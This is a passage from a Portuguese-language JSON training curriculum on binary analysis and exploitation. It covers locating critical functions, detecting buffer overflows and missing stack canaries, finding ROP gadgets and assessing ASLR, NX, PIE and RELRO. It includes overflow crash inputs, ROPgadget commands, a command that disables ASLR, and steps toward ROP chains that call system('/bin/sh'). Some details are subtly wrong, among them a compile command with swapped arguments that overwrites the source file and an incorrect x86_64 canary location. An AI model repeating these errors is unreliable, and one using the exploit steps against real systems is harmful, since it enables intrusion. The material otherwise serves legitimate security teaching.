                                  "commonMistakes": "Sobrecarregar com funções irrelevantes; ignorar funções inline."
                                }
                              ],
                              "practicalExample": "Em um binário 'vuln_app.exe' (x86), entry point em 0x401000 leva a __main em 0x401200; trace calls revelam main() em 0x401500 com calls para strcpy() crítica em 0x401800, focando análise em buffer overflow ali.",
                              "finalVerifications": [
                                "Entry point e main() localizados corretamente em binário desconhecido.",
                                "Lista de 3+ funções críticas com endereços e razões.",
                                "Fluxo de main() para funções críticas mapeado sem erros.",
                                "Análise resiste a ofuscação básica (ex: junk code).",
                                "Tempo total de identificação < 1 hora para binário médio.",
                                "Documentação clara com screenshots de disassembly."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização (100% correto para entry/main).",
                                "Profundidade de análise de funções críticas (cobertura >80%).",
                                "Eficiência temporal (dentro dos estimates).",
                                "Qualidade da documentação (passos reproduzíveis).",
                                "Capacidade de justificar escolhas com evidências assembly.",
                                "Resiliência a variações arquiteturais (x86/x64)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender linkage e calling conventions.",
                                "Sistemas Operacionais: Conhecimento de loaders PE/ELF.",
                                "Análise de Malware: Aplicação em triage de amostras.",
                                "Engenharia Reversa: Fundamento para debugging dinâmico."
                              ],
                              "realWorldApplication": "Em análise forense de malware, identificar main() e funções como 'infect()' permite priorizar payloads perigosos, acelerando resposta a incidentes em equipes de SOC ou CTI."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.2.3",
                        "name": "Detecção de Vulnerabilidades",
                        "description": "Técnicas para inspecionar binários em busca de pontos fracos como overflows, ROP gadgets e ausência de proteções.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.3.1",
                            "name": "Procurar por buffer overflows",
                            "description": "Identificar usos inseguros de strcpy, gets e arrays sem bounds checking no código assembly.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Carregar Binário para Análise Estática",
                                  "subSteps": [
                                    "Instale ferramentas de desassembly como Ghidra, IDA Free ou Radare2.",
                                    "Compile um binário de exemplo vulnerável em C usando gcc sem flags de segurança (ex: gcc -m32 -fno-stack-protector -o vuln vuln.c).",
                                    "Carregue o binário na ferramenta escolhida e navegue para a visão de desassembly.",
                                    "Identifique a seção de código principal e funções suspeitas.",
                                    "Anote endereços de memória e registradores relevantes."
                                  ],
                                  "verification": "Confirme que o binário está carregado corretamente e você pode visualizar o código assembly sem erros de parsing.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ghidra ou Radare2, GCC compiler, binário vulnerável de exemplo.",
                                  "tips": "Use binários de 32-bit para simplicidade inicial em análises de stack overflows.",
                                  "learningObjective": "Configurar um ambiente de análise estática pronto para detecção de vulnerabilidades de memória.",
                                  "commonMistakes": "Esquecer de desabilitar proteções como stack canary (-fno-stack-protector), levando a assembly limpo sem vulnerabilidades aparentes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Chamadas Inseguras a strcpy e gets no Assembly",
                                  "subSteps": [
                                    "Procure por strings de referência como 'strcpy' ou 'gets' na seção de imports ou cross-references.",
                                    "Navegue para as chamadas (calls) dessas funções e examine os argumentos em registradores (ex: EDI para destino, ESI para fonte em x86).",
                                    "Verifique se o destino é um buffer fixo no stack (ex: sub esp, 0x100 para alocar buffer).",
                                    "Analise o tamanho do buffer destino vs. entrada fonte para ausência de verificação.",
                                    "Marque locais com comentários como 'POTENCIAL OVERFLOW: strcpy sem bounds check'."
                                  ],
                                  "verification": "Liste pelo menos 2 chamadas identificadas com endereços e argumentos anotados corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Ferramenta de desassembly com cross-references ativadas, binário vulnerável.",
                                  "tips": "Use busca por strings (Ctrl+F em Ghidra) para funções libc comuns.",
                                  "learningObjective": "Reconhecer padrões de chamadas a funções inseguras de manipulação de strings em assembly.",
                                  "commonMistakes": "Confundir chamadas com implementações inline; sempre verifique imports."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detectar Arrays sem Bounds Checking e Acessos Vulneráveis",
                                  "subSteps": [
                                    "Procure por alocações de arrays no stack (ex: sub esp, N para buffer local).",
                                    "Identifique loops ou acessos indexados (ex: mov eax, [ebp + index*4]) sem comparações if (cmp eax, size).",
                                    "Rastreie índices de array em registradores e verifique ausência de mul/add com bounds.",
                                    "Examine condições de loop (ex: jle para sair se index < size).",
                                    "Documente acessos como [ebp - 0x100 + eax] onde eax pode exceder limites."
                                  ],
                                  "verification": "Anote 3 exemplos de acessos a arrays com potencial overflow, incluindo ausência de checks.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Ferramenta de desassembly com graph view para fluxos de loop.",
                                  "tips": "Ative graph view para visualizar loops e condições de saída.",
                                  "learningObjective": "Identificar padrões de arrays locais vulneráveis a overflows em código assembly.",
                                  "commonMistakes": "Ignorar overflows heap; foque em stack para este escopo (ebp-based)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Contexto, Confirmar Vulnerabilidades e Gerar Relatório",
                                  "subSteps": [
                                    "Rastreie o fluxo de controle antes/depois das chamadas suspeitas para inputs não sanitizados.",
                                    "Simule execução manualmente (ex: trace registers em debugger como GDB).",
                                    "Confirme se buffer destino é menor que possível input (calcule tamanhos).",
                                    "Compile relatório com screenshots, endereços e severidade (CVSS-like).",
                                    "Teste com PoC: execute binário com input longo para crash (ex: python -c 'print(\"A\"*300)' | ./vuln)."
                                  ],
                                  "verification": "Relatório gerado com pelo menos 2 vulnerabilidades confirmadas via PoC crash.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "GDB ou debugger integrado, PoC input generator.",
                                  "tips": "Use 'pattern_create' do Metasploit para inputs únicos e calcular offsets exatos.",
                                  "learningObjective": "Validar e documentar buffer overflows detectados em binários reais.",
                                  "commonMistakes": "Não testar com PoC; análise estática sozinha pode false positive."
                                }
                              ],
                              "practicalExample": "Considere um binário compilado de: char buf[64]; gets(buf); strcpy(buf2, buf);. No assembly: sub esp,0x40 (buf=64 bytes), call gets@plt (sem size), call strcpy@plt com buf2=32 bytes -> overflow quando input >32.",
                              "finalVerifications": [
                                "Identificou todas chamadas a strcpy/gets no binário.",
                                "Marcou acessos a arrays sem cmp/jcc para bounds.",
                                "Simulou overflow com PoC causando segfault.",
                                "Gerou relatório com endereços exatos e evidências.",
                                "Explicou como exploit poderia retornar shell.",
                                "Verificou ausência de mitigações como ASLR/NX em runtime."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de padrões strcpy/gets (90%+ recall).",
                                "Detalhe nos substeps de análise de arrays (bounds checks ausentes).",
                                "Qualidade do PoC e reprodução de crash.",
                                "Relatório claro com screenshots e explicações técnicas.",
                                "Compreensão de impactos (controle de EIP via overflow).",
                                "Tempo total dentro de 2 horas sem erros graves."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender fontes de vulnerabilidades em strings/arrays.",
                                "Arquitetura de Computadores: Registradores stack (EBP/ESP) e overflows.",
                                "Análise Reversa: Uso de desassemblers em engenharia de software.",
                                "Ética em Cibersegurança: Responsabilidade em reporting de vulns."
                              ],
                              "realWorldApplication": "Em pentests (ex: CTFs como PicoCTF), análise de malware (ransomware com shellcode via overflow), auditorias de firmware IoT vulnerável a ataques remotos."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.3.2",
                            "name": "Detectar ausência de canários",
                            "description": "Verificar chamadas a __stack_chk_fail ou padrões de stack canary no disassembly para avaliar proteções de memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e preparar binários de teste",
                                  "subSteps": [
                                    "Instale ferramentas de análise estática como objdump (parte do binutils), Ghidra ou radare2.",
                                    "Compile um binário de teste vulnerável em C com buffer no stack usando 'gcc -fno-stack-protector -no-pie -o vuln.c vuln' para desabilitar canaries.",
                                    "Compile uma versão protegida com 'gcc -fstack-protector -o vuln_protected vuln.c' para comparação.",
                                    "Execute 'file vuln' e 'checksec vuln' (se disponível) para confirmar configurações iniciais de segurança.",
                                    "Abra o binário em um editor de disassembly para inspeção preliminar."
                                  ],
                                  "verification": "Confirme que ambos os binários foram compilados corretamente e que checksec mostra 'Stack Canary: No' para o binário sem proteção.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "GCC compiler, binutils (objdump), checksec.sh, código-fonte C de exemplo com buffer overflow (ex: char buf[64]; gets(buf);).",
                                  "tips": "Use um VM Linux x86_64 para consistência em offsets de canary (geralmente GS:0x14 em x86_64).",
                                  "learningObjective": "Entender como preparar binários controlados para isolar a análise de proteções de stack canary.",
                                  "commonMistakes": "Esquecer de desabilitar PIE ou usar flags erradas, confundindo com ASLR; sempre verificar com checksec."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar e navegar pelo disassembly do binário",
                                  "subSteps": [
                                    "Execute 'objdump -d vuln > vuln.asm' ou abra no Ghidra para disassembly completo.",
                                    "Identifique funções com manipulações de stack (ex: sub %rsp, N; lea addr(%rsp), %reg para buffers).",
                                    "Localize o prólogo da função (push %rbp; mov %rsp, %rbp) e epílogo (leave; ret).",
                                    "Procure padrões iniciais de canary: 'mov %gs:0x14, %rax' ou similar no prólogo.",
                                    "Anote offsets de funções relevantes como main ou funções com inputs perigosos (gets, strcpy)."
                                  ],
                                  "verification": "Disassembly gerado mostra prólogo/epílogo claramente visíveis sem interrupções iniciais de canary.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Objdump, Ghidra ou radare2, binários compilados.",
                                  "tips": "Filtre por 'main:' ou use busca por 'sub %rsp' para focar em funções com stack grande.",
                                  "learningObjective": "Dominar geração e navegação em disassembly para focar em regiões críticas de stack.",
                                  "commonMistakes": "Confundir registradores locais com canary; canary usa GS segment em x86_64, não RSP diretamente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar inserção e verificação do stack canary",
                                  "subSteps": [
                                    "No prólogo, busque 'mov %%gs:0x14, %%rax; mov %%rax, -0x8(%%rbp)' ou equivalente (salva canary em stack).",
                                    "No epílogo, procure 'mov -0x8(%%rbp), %%rax; cmp %%gs:0x14, %%rax; je end; call __stack_chk_fail'.",
                                    "Compare com binário protegido: deve ter essas instruções extras ausentes no vulnerável.",
                                    "Use busca textual no ASM por '__stack_chk_fail' ou 'stack_chk'.",
                                    "Documente ausência: nenhuma dessas sequências encontradas em funções com buffers."
                                  ],
                                  "verification": "Lista exata de instruções ausentes confirmada em pelo menos 2 funções stack-intensivas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Disassembly files (.asm ou Ghidra project), editor de texto com busca (vim/grep).",
                                  "tips": "Grep 'gs:0x14|stack_chk' no arquivo ASM para automação rápida.",
                                  "learningObjective": "Reconhecer padrões exatos de setup e check de canary em assembly x86/x86_64.",
                                  "commonMistakes": "Ignorar funções inline ou otimizadas onde canary pode ser movido; sempre cheque múltiplas funções."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Confirmar ausência e testar implicações",
                                  "subSteps": [
                                    "Execute o binário com input overflow (ex: python -c 'print \"A\"*100' | ./vuln) para crash sem canary fail.",
                                    "Compare com protegido: crash imediato vs. segfault em __stack_chk_fail.",
                                    "Gere relatório: 'Ausência de canary detectada em main@offset, risco de stack overflow remoto'.",
                                    "Repita em outro binário ou arquitetura para generalização.",
                                    "Salve screenshots de disassembly como evidência."
                                  ],
                                  "verification": "Overflow testa crash direto sem '*** stack smashing detected ***', confirmando ausência.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Binários testáveis, gdb para debug opcional, inputs de teste.",
                                  "tips": "Use 'gdb ./vuln' e 'r < input.txt' para inspecionar crash sem canary protection.",
                                  "learningObjective": "Validar detecção estática com teste dinâmico e relatar riscos adequadamente.",
                                  "commonMistakes": "Atribuir crash a outros fatores (ex: NX); isole com -fno-stack-protector-all."
                                }
                              ],
                              "practicalExample": "Ao disassemblar um binário CTF 'vuln_pwn' com objdump, na função main: prólogo 'push %rbp; mov %rsp,%rbp; sub $0x50,%rsp', sem 'mov %gs:0x14,%rax', e epílogo direto 'leave; ret' sem 'cmp %gs:0x14,%rax; call __stack_chk_fail'. Overflow com cyclic pattern confirma ROP chain possível devido à ausência.",
                              "finalVerifications": [
                                "Identifica corretamente ausência em 3+ funções com buffers no stack.",
                                "Explica mecanismo de canary (valor randômico por thread, check pré-ret).",
                                "Diferencia de binário protegido via comparação side-by-side.",
                                "Testa dinamicamente com overflow sem 'stack smashing' message.",
                                "Documenta padrões exatos ausentes (GS load, __stack_chk_fail).",
                                "Gera relatório com offsets e riscos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de padrões de canary (100% match com referências).",
                                "Eficiência: análise completa em <80 minutos.",
                                "Qualidade da documentação: inclui ASM snippets e testes.",
                                "Compreensão conceitual: explica por que ausência permite overflows.",
                                "Generalização: aplica a binários não-triviais ou cross-arch.",
                                "Ausência de falsos positivos (não confunde com shadow stack ou CFI)."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly (x86_64): reconhecimento de instruções segmentadas (GS).",
                                "Programação em C: compreensão de stack frames e buffer overflows.",
                                "Sistemas Operacionais: proteções de processo (canaries em glibc).",
                                "Engenharia Reversa: uso de ferramentas como Ghidra para análise estática.",
                                "Testes de Penetração: validação estática-dinâmica de vulnerabilidades."
                              ],
                              "realWorldApplication": "Em auditorias de segurança de firmware IoT ou binários legados, detectar ausência de canaries permite priorizar alvos para exploits de buffer overflow em pentests, ou recomendar recompile com -fstack-protector-strong para mitigar ROP attacks em produção."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.3.3",
                            "name": "Encontrar ROP gadgets",
                            "description": "Usar ROPgadget ou scripts para listar sequências de instruções úteis para ataques de controle de fluxo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e o binário alvo",
                                  "subSteps": [
                                    "Instale o ROPgadget via pip: pip install ROPgadget",
                                    "Baixe ou compile um binário ELF vulnerável (ex: use checksec para verificar proteções ausentes como NX e ASLR)",
                                    "Identifique a arquitetura do binário com file ou objdump -f",
                                    "Configure um ambiente isolado como Docker ou VM para evitar riscos",
                                    "Teste o ROPgadget com --help para confirmar instalação"
                                  ],
                                  "verification": "Execute ROPgadget --version e confirme que o binário é analisado sem erros com ROPgadget --binary <arquivo>",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Sistema Linux/WSL",
                                    "Python 3+",
                                    "Binário ELF de exemplo (ex: de CTF como picoCTF)"
                                  ],
                                  "tips": "Use um ambiente virtual (virtualenv) para evitar conflitos de dependências",
                                  "learningObjective": "Configurar ferramentas e ambiente seguro para análise de ROP",
                                  "commonMistakes": [
                                    "Ignorar arquitetura (32/64-bit)",
                                    "Executar em binários protegidos sem desabilitar ASLR",
                                    "Não isolar o ambiente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar ROPgadget básico para listar gadgets",
                                  "subSteps": [
                                    "Execute ROPgadget --binary <arquivo> para lista completa",
                                    "Filtre por gadgets úteis: ROPgadget --binary <arquivo> --string \"pop|ret\"",
                                    "Use opções como --only \"pop|mov|ret\" para focar em instruções chave",
                                    "Salve a saída em arquivo: ROPgadget --binary <arquivo> > gadgets.txt",
                                    "Analise manualmente os primeiros gadgets para entender offsets"
                                  ],
                                  "verification": "Gere uma lista com pelo menos 10 gadgets úteis como 'pop rdi; ret'",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "ROPgadget instalado",
                                    "Binário ELF vulnerável"
                                  ],
                                  "tips": "Combine com --depth 20 para chains mais longas",
                                  "learningObjective": "Gerar e filtrar listas de ROP gadgets usando comandos básicos",
                                  "commonMistakes": [
                                    "Não filtrar por instruções relevantes",
                                    "Confundir offsets relativos/absolutos",
                                    "Ignorar endianness"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar e categorizar gadgets úteis",
                                  "subSteps": [
                                    "Classifique gadgets por tipo: pop/ret, mov, syscall, etc.",
                                    "Verifique utilidade para ataques (ex: pop rdi para arg1 em execve)",
                                    "Use objdump -d <arquivo> para validar instruções em contexto",
                                    "Crie uma tabela manual: gadget, offset, uso (ex: stack pivot)",
                                    "Teste gadgets em GDB com gef ou pwndbg para confirmação"
                                  ],
                                  "verification": "Documente 5 gadgets com offsets e usos potenciais em um relatório",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "GDB com plugins (gef/pwndbg)",
                                    "Editor de texto"
                                  ],
                                  "tips": "Procure por 'ret' sleds para chains iniciais",
                                  "learningObjective": "Interpretar saídas de ROPgadget e mapear para payloads ROP",
                                  "commonMistakes": [
                                    "Não validar em disassembler",
                                    "Assumir gadgets sem contexto de registradores",
                                    "Overlook gadgets multi-instrução"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar scripts personalizados para busca avançada",
                                  "subSteps": [
                                    "Escreva um script Python usando pwntools ou capstone para parse binário",
                                    "Extraia seções .text com objdump e busque padrões regex (ex: b'pop rdi; ret')",
                                    "Integre ROPgadget em script: subprocess.call(['ROPgadget', ...])",
                                    "Adicione filtros customizados como bad chars ou align requirements",
                                    "Teste o script em múltiplos binários e compare saídas"
                                  ],
                                  "verification": "Execute script e gere relatório comparativo com ROPgadget nativo",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Python com pwntools/capstone",
                                    "Binários de teste variados"
                                  ],
                                  "tips": "Use radare2 (r2) para scripting mais avançado com r2pipe",
                                  "learningObjective": "Automatizar detecção de ROP gadgets para eficiência",
                                  "commonMistakes": [
                                    "Script sem handling de erros",
                                    "Ignorar mitigações como RELRO",
                                    "Não testar em arches diferentes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário vulnerável como 'vuln' de picoCTF, execute 'ROPgadget --binary vuln --only \"pop|ret\"' para encontrar '0x0000000000400523 : pop rdi ; ret'. Use isso para setar rdi=bin/sh em um ROP chain para system().",
                              "finalVerifications": [
                                "Lista pelo menos 10 gadgets únicos com offsets corretos",
                                "Explica uso de 3 gadgets em um cenário de exploit (ex: stack pivot)",
                                "Script personalizado encontra gadgets idênticos ao ROPgadget",
                                "Valida gadgets em GDB sem crashes",
                                "Identifica limitações em binários protegidos (PIE/NX)"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e categorização de gadgets (90% match com ferramentas)",
                                "Explicação clara de utilidade em ataques de controle de fluxo",
                                "Eficiência do script customizado (tempo < ROPgadget manual)",
                                "Análise de contexto assembly (registradores/offsets)",
                                "Relatório completo com exemplos e verificações",
                                "Considere mitigações como ASLR/DEP"
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly (x86/64) para compreensão de instruções",
                                "Programação Python para scripts de automação",
                                "Engenharia Reversa com ferramentas como GDB/Radare2",
                                "Estruturas de Dados (chains ROP como linked lists)",
                                "Algoritmos de busca (regex/pattern matching)"
                              ],
                              "realWorldApplication": "Em pentests e CTFs, ROP gadgets são essenciais para exploits em binários sem proteções completas, permitindo bypass de DEP/NX para execução de shellcode em ataques como buffer overflow, comum em relatórios de vulnerabilidades CVE."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.3.4",
                            "name": "Avaliar ASLR e proteções",
                            "description": "Inspecionar headers para flags de NX, PIE e RELRO, simulando impactos em exploits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de ASLR, NX, PIE e RELRO",
                                  "subSteps": [
                                    "Pesquise definições: ASLR randomiza endereços de memória para dificultar exploits baseados em endereços fixos.",
                                    "Estude NX (No eXecute): flag que marca páginas de dados como não executáveis, prevenindo shellcode em stack/heap.",
                                    "Analise PIE (Position Independent Executable): permite carregamento em endereços aleatórios, complemento ao ASLR.",
                                    "Revise RELRO (RELocation Read-Only): torna seções de relocação somente leitura, protegendo GOT/PLT contra sobrescrita.",
                                    "Compare impactos: discuta como cada proteção mitiga ROP, buffer overflows e ret2libc."
                                  ],
                                  "verification": "Explique em suas palavras o propósito de cada proteção e dê um exemplo de exploit que cada uma bloqueia.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação oficial do kernel Linux sobre ASLR/NX",
                                    "Artigos sobre PIE e RELRO no site Phrack ou ROP Emporium",
                                    "Notas pessoais ou mindmap"
                                  ],
                                  "tips": "Use analogias: ASLR é como mudar senhas diariamente; NX é uma fechadura que impede execução de 'lixo'.",
                                  "learningObjective": "Dominar os mecanismos e vulnerabilidades mitigadas por cada proteção de memória.",
                                  "commonMistakes": [
                                    "Confundir ASLR (runtime) com PIE (compile-time)",
                                    "Achar que NX protege contra ROP (não protege ROP chains)",
                                    "Ignorar que RELRO parcial ainda deixa GOT vulnerável"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar Headers de Binários com Ferramentas Básicas",
                                  "subSteps": [
                                    "Instale ferramentas: readelf, objdump e checksec.sh em um ambiente Linux (ex: Kali).",
                                    "Execute 'readelf -h binary' para headers ELF e identifique GNU_STACK (WX para NX ausente).",
                                    "Use 'readelf -d binary | grep BIND_NOW' para RELRO full; grep TEXTREL para relocs executáveis.",
                                    "Rode 'objdump -h binary' para verificar seções .text como TEXTREL-free e flags de PIE via 'readelf -h | grep Type: DYN'.",
                                    "Compare binários: analise /bin/ls (protegido) vs um binário estático vulnerável."
                                  ],
                                  "verification": "Gere um relatório listando flags encontradas em um binário de exemplo, com saídas de comandos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramentas: readelf, objdump, checksec.sh",
                                    "Binários de teste: /bin/ls, ROPgadget challenges",
                                    "Ambiente VM Linux"
                                  ],
                                  "tips": "Salve saídas em arquivos txt para comparação side-by-side; use checksec para validação rápida.",
                                  "learningObjective": "Habilidade prática em extrair flags de proteção de headers ELF usando ferramentas padrão.",
                                  "commonMistakes": [
                                    "Interpretar errado GNU_STACK RW como NX (é ausência de X)",
                                    "Confundir RELRO full (BIND_NOW + no TEXTREL) com partial",
                                    "Esquecer de verificar PIE em binários dinâmicos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Impactos das Proteções em Cenários de Exploit",
                                  "subSteps": [
                                    "Compile binários vulneráveis: um sem proteções (buffer overflow simples) e com ASLR/NX/PIE/RELRO ativados.",
                                    "Teste exploit sem ASLR: use gdb para encontrar endereços fixos e execute shellcode.",
                                    "Ative ASLR (setarch -R) e observe falhas; tente PIE bypass com leaks ou brute force.",
                                    "Simule ROP com rp++ ou ROPgadget em binário com NX (sem shellcode direto), mostrando chain em PLT.",
                                    "Demonstre RELRO: tente GOT overwrite em partial vs full RELRO, usando pwntools para automação."
                                  ],
                                  "verification": "Crie e execute um PoC exploit que falha com proteções ativadas, documentando diferenças.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GDB, pwntools ou Python para exploits",
                                    "Compilador GCC com flags -fno-stack-protector -z norelro etc.",
                                    "Desafios CTF como ROP Emporium ou PicoCTF"
                                  ],
                                  "tips": "Use 'echo 0 > /proc/sys/kernel/randomize_va_space' para desabilitar ASLR temporariamente durante testes.",
                                  "learningObjective": "Entender empiricamente como proteções alteram viabilidade de exploits clássicos.",
                                  "commonMistakes": [
                                    "Não isolar ASLR de PIE nos testes",
                                    "Usar shellcode em NX sem ROP",
                                    "Ignorar leaks parciais que bypassam ASLR"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Realizar Análise Completa e Relatório de Proteções",
                                  "subSteps": [
                                    "Escolha um binário real (ex: app custom ou CTF): rode checksec e readelf/objdump full.",
                                    "Classifique nível de proteção: baixo/médio/alto baseado em presença de ASLR/PIE/NX/RELRO.",
                                    "Simule chain de ataque: identifique mitigações restantes (ex: Canary se NX presente).",
                                    "Gere relatório: tabela com flags, comandos usados, impactos em exploits potenciais.",
                                    "Recomende melhorias: flags de compile como -pie -fstack-protector -Wl,-z,relro,-z,now."
                                  ],
                                  "verification": "Produza um relatório PDF/MD com análise de 2+ binários, incluindo screenshots de outputs.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor Markdown ou LaTeX",
                                    "Binários variados (protegidos e não)",
                                    "Script bash para automação de checksec"
                                  ],
                                  "tips": "Crie um checklist template para análises futuras; priorize RELRO full para produção.",
                                  "learningObjective": "Integrar inspeção e simulação em uma avaliação holística de binários.",
                                  "commonMistakes": [
                                    "Superestimar proteções parciais como 'seguras'",
                                    "Esquecer ASLR full64 vs partial32",
                                    "Não testar em runtime com ASLR ativado"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o binário '/bin/cat' no Kali Linux: rode 'checksec cat' (mostra NX:Yes, PIE:Yes, RELRO:Full). Descompile com objdump -d, simule buffer overflow em gdb (ASLR on), observe falha em endereços randomizados e ROP necessário devido a NX.",
                              "finalVerifications": [
                                "Identificar corretamente todas as flags (NX, PIE, RELRO) em um binário desconhecido usando readelf/objdump.",
                                "Explicar impacto de ASLR em um exploit ret2libc com exemplo de código.",
                                "Demonstrar bypass parcial de proteções via leak de endereço em PoC.",
                                "Classificar um binário como 'altamente protegido' ou 'vulnerável' com justificativa.",
                                "Gerar relatório com saídas de ferramentas e recomendações de hardening.",
                                "Comparar dois binários e destacar diferenças em proteções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de flags (100% correto em 3 binários).",
                                "Profundidade da simulação de exploits (PoC executável mostrando falhas).",
                                "Clareza do relatório (estrutura, screenshots, conclusões acionáveis).",
                                "Compreensão conceitual (explicações sem erros comuns).",
                                "Criatividade em conexões com exploits reais (ex: EternalBlue mitigações).",
                                "Eficiência temporal (concluir em <3h total)."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entendimento de memória virtual e MMU.",
                                "Programação em C/Assembly: Compilação com flags de segurança e ROP chains.",
                                "Redes e Sistemas Operacionais: Kernel configs para ASLR e syscalls relacionadas.",
                                "Ética em Cibersegurança: Implicações legais de análise de binários proprietários.",
                                "Análise de Malware: Identificação de proteções em samples maliciosos."
                              ],
                              "realWorldApplication": "Em pentests/red teaming, avaliadores usam isso para priorizar alvos (binários sem PIE/RELRO são low-hanging fruit); em DevSecOps, integra em CI/CD para scanning de builds; forensics usa para triagem de dumps de memória em incident response."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.3",
                    "name": "Ataques ao Controle de Fluxo",
                    "description": "Exploração de falhas que permitem alteração do fluxo normal de execução de programas.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.3.1",
                        "name": "Ataques de Overflow de Buffer",
                        "description": "Exploração de vulnerabilidades de overflow em pilha que permitem a sobrescrita do endereço de retorno, alterando o fluxo de execução para código malicioso.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.1.1",
                            "name": "Identificar vulnerabilidades de buffer overflow em código C/C++",
                            "description": "Analisar código fonte para detectar funções como strcpy ou gets sem verificação de limites, simulando cenários de sobrescrita de pilha.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Buffers e Stack em C/C++",
                                  "subSteps": [
                                    "Estude o conceito de buffer como array de tamanho fixo na memória.",
                                    "Aprenda a estrutura da pilha (stack) e como variáveis locais são alocadas.",
                                    "Identifique como entradas de usuário podem exceder o tamanho do buffer.",
                                    "Visualize diagramas de sobrescrita de pilha com ferramentas como GDB ou Draw.io.",
                                    "Diferencie stack overflow de heap overflow."
                                  ],
                                  "verification": "Desenhe um diagrama simples da pilha antes e depois de um overflow e explique verbalmente.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Compilador GCC/Clang",
                                    "Documentação man pages para malloc e stack",
                                    "Ferramenta de diagramação (ex: Draw.io)"
                                  ],
                                  "tips": "Use printf para inspecionar endereços de memória durante testes iniciais.",
                                  "learningObjective": "Dominar os conceitos básicos de alocação de memória na pilha e mecanismos de overflow.",
                                  "commonMistakes": [
                                    "Confundir stack com heap",
                                    "Ignorar o papel do frame pointer (EBP)",
                                    "Assumir que todos os overflows são intencionais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Funções e Práticas Inseguras",
                                  "subSteps": [
                                    "Liste funções perigosas: strcpy, gets, sprintf sem limites.",
                                    "Compare com alternativas seguras: strncpy, fgets, snprintf.",
                                    "Procure por ausência de verificações de tamanho (strlen(input) > buffer_size).",
                                    "Analise exemplos de código com essas funções em repositórios open-source.",
                                    "Use grep ou IDE para buscar padrões como 'strcpy(' em código."
                                  ],
                                  "verification": "Liste 5 funções inseguras e forneça sinônimos seguros para cada uma.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Referência CWE-120 (Buffer Copy without Checking Size)",
                                    "Editor de código com busca (VS Code, Vim)"
                                  ],
                                  "tips": "Sempre pergunte: 'Há verificação de limite antes da cópia?'",
                                  "learningObjective": "Reconhecer padrões de código que introduzem riscos de buffer overflow.",
                                  "commonMistakes": [
                                    "Esquecer funções como strcat ou memcpy sem tamanho",
                                    "Confundir gets com scanf",
                                    "Ignorar bibliotecas personalizadas com bugs similares"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Código Fonte para Vulnerabilidades Específicas",
